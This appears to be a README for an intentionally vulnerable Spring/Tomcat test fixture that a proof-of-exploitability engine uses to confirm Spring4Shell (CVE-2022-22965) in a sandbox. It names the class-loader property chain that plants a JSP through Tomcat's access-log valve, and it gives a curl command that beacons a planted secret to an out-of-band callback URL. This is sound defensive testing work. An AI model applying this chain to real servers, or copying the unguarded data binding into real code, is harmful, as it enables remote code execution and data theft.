# Firing demo-java-svc as a Tegron PoE fixture

`demo-java-svc@vulnerable` is authored as a **fireable** fixture: a live `tegrond` fire
against the containerised WAR crosses stage 8/10 `sandbox_observability` and emits a real
proven apex, produced by execution. Java Prove is **via container** — the repo-root
`Dockerfile` builds the WAR and runs it on standalone Tomcat 9 / JDK 11 (the affected
Spring4Shell configuration; an embedded Boot fat-jar is not).

## Pinned tags

This is a synthetic fixture (Ferralon-authored, no upstream code). An annotated git tag pins the
vulnerable commit below so the PoE narrative has a stable reference even as the branch moves; no fix
branch is published yet, so there is no `pone` tag.

| Tag | Commit | Pins |
|---|---|---|
| [`poe`](https://github.com/ferralon-demo/demo-java-svc/tree/poe) | `41690893` | `vulnerable` branch tip (fireable, PoE) |

## Recommended fire — CVE-2022-22965 (Spring4Shell, the hero)

| Field (tegron-tui)        | Value                                            |
|---------------------------|--------------------------------------------------|
| Vulnerability ID          | `CVE-2022-22965`                                 |
| Source (osv\|nvd\|ghsa)   | the source the free scan keys it under (ghsa/nvd)|
| Repo URL                  | `git@github.com:ferralon-demo/demo-java-svc.git` |
| Ref                       | `vulnerable`                                      |
| Execution                 | `image` (the repo-root Dockerfile is built)      |
| Ownership token           | any non-empty value (e.g. `owner-token`)         |

**Expected honest outcome:** `Outcome == signal_fired`, `Attribution == intrinsic_canary`,
`Replication.Fired >= 1` (of 3 trials). The proof is the container executing an
attacker-planted command that reads the per-assessment seed and beacons it to the OOB
endpoint — genuine remote code execution reached through Spring's data binder.

## The reachability condition this fixture embodies

All four preconditions of the advisory are met by construction — none are faked:

1. **Vulnerable dependency** — `spring-beans` / `spring-webmvc` pinned `5.3.17` (< 5.3.18),
   see `pom.xml` (`${spring.version}`).
2. **JDK 9+** — the runtime stage is `tomcat:9-jre11`; the `class.module.classLoader.*`
   walk requires the JDK-9 module accessor (`getModule()`), absent on JDK 8.
3. **Standalone Tomcat WAR** — packaged `war`, deployed as `webapps/ROOT.war`; the classic
   AccessLogValve reconfiguration path exists only in this deployment shape.
4. **Reachable data binding** — `POST /greeting` binds untrusted request parameters onto a
   non-primitive command object (`Greeting`) via `@ModelAttribute`, with **no**
   `@InitBinder` restricting the bindable field set (no `setDisallowedFields("class.*")`).

## How it fires (the canary contract)

1. The sandbox builds the repo-root `Dockerfile` → workload image (the hypothesis `image`
   input).
2. It plants a per-assessment secret at `/tmp/tegron_canary` and injects `TEGRON_OOB_URL`
   (its callback listener) into the container.
3. A model-generated trigger drives `POST /greeting` with the Spring4Shell property chain
   (`class.module.classLoader.resources.context.parent.pipeline.first.*`) to reconfigure
   Tomcat's access-log valve into dropping a JSP into `webapps/ROOT`, then requests that
   JSP with a command that reads the seed and beacons it. The trigger never references the
   seed path or `TEGRON_OOB_URL` directly (fail-closed guard).
4. The data binder walks the class-loader chain (the CVE-2022-22965 sink) → the planted
   command executes → `curl "$TEGRON_OOB_URL?kind=canary&data=<seed>"`. The seed surfacing
   at the OOB listener is the intrinsic, attributable signal.

## PoNE second trace (proves the fix is not exploitable)

- **Ref:** `patched` — fix **mode 1 (dependency version bump)**: `${spring.version}` →
  `5.3.18`. The 5.3.18 fix filters `classLoader` / `protectionDomain` / `module` property
  access out of `CachedIntrospectionResults`, so the same property chain is rejected by the
  binder → no valve reconfiguration, no JSP written, nothing beaconed → `not_exploitable`.
  The `patched` ref carries the same `Dockerfile`, so it builds and runs identically; only
  the Spring version differs (a clean two-trace: predecessor fires, patched build dark).

## The other two advisories (static verdicts — not fired)

These are reachability/version verdicts from the free scan, not execution fires:

- **CVE-2019-17531 (`jackson-databind` 2.9.9) → `not_exploitable`.** The dependency matches
  the advisory and jackson is genuinely reached from `POST /echo`, but Default Typing is
  never enabled and the body binds into a concrete, non-polymorphic type (`EchoMessage`),
  so the polymorphic-gadget sink is unreachable. Grounded-safe, not disqualified.
- **CVE-2012-0838 / CVE-2016-3087 (`struts2-core` 6.4.0) → `disqualified`.** Struts 2 is
  present in the dependency graph but pinned well past the affected range for the OGNL /
  REST-plugin RCEs, so those advisories are provably out of scope by version.

## Local verification performed

`mvn package` builds `target/ROOT.war` cleanly (via the `maven:3.9-eclipse-temurin-11`
build stage — no local JDK/Maven required). The `docker build` produces a Tomcat image that
serves the WAR on `:8080` (`GET /healthz` → `ok`). The live-fire canary reproduction
(plant seed → inject `TEGRON_OOB_URL` → drive the Spring4Shell trigger → observe the OOB
beacon; and the negative control on `patched`) is the engine's step, run by Tegron/Eric.
